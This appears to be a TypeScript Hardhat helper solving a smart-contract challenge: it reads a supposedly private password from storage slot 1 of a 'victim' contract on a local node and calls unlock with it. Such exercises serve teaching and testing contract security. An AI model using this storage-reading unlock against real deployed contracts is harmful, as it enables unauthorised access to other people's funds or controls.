import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {

  const storageIndex = 0;

  const provider = ethers.getDefaultProvider("http://localhost:8545");
  const password = await provider.getStorageAt(victim.address,1);
  await victim.unlock(password);

};

export default helper;
